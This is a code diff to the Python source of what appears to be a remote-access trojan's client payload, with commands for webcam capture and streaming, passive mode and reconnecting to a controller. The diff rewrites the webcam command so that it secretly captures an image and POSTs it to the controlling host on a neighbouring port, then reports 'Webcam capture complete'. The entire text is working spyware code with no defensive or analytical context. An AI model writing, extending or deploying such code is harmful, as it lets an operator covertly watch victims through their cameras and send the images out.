@@ -622,17 +622,19 @@ class Payload():
             args = str(args).split()
             if 'stream' in args:
                 if len(args) != 2:
-                    result = "Error - stream mode requires argument: 'port'"
+                    log("Error - stream mode requires argument: 'port'")
                 elif not args[1].isdigit():
-                    result = "Error - port must be integer between 1 - 65355"
+                    log("Error - port must be integer between 1 - 65355")
                 else:
-                    result = globals()['webcam'].stream(port=args[1])
-            else:
-                result = globals()['webcam'].image(*args) if 'video' not in args else globals()['webcam'].video(*args)
+                    globals()['webcam'].stream(port=args[1])
+            elif 'image' in args:
+                img = globals()['webcam'].image(*args)
+                data = {"png": img}
+                host, port = self.connection.getpeername()
+                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
         except Exception as e:
-            result = "{} error: {}".format(self.webcam.func_name, str(e))
-            log(result)
-        return result
+            log("{} error: {}".format(self.webcam.func_name, str(e)))
+        return "Webcam capture complete"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
@@ -643,7 +645,6 @@ class Payload():
         """
         self.flags['connection'].clear()
         self._get_connection()
-        
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
     def restart(self, output='connection'):
